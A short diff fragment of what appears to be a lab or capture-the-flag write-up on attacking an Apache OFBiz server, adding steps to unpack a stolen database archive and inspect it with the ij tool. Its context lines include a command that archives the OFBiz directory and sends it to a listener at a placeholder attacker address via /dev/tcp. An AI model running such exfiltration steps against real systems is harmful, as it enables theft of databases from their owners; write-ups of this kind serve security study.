@@ -21,3 +21,9 @@
  - tar cvf ofbiz.tar ofbiz
 
  - cat ofbiz.tar > /dev/tcp/ATTACKER_IP/4444 (Compress the entire database with tar, then write all data to our listener)
+
+## Once downloaded, we extract the archive and use ij to inspect the database on our attacking machine
+
+ - tar xvf ofbiz.tar
+
+ - ij
